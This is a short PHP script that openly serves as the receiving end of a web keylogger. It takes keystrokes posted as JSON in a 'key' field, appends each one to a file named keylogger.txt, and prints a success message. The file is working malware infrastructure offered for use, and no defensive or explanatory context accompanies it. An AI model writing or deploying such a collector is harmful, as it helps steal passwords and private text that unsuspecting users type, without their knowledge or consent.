
<?php   

$fopen = fopen("keylogger.txt", "a+");

$key = json_decode($_POST["key"]);

foreach ($key as $mykey=>$value) { 
    fwrite($fopen, $value); 
}

// (C) CLOSE & END
fclose($fopen);
echo "the keylogger has been recorded succussefuly";



?>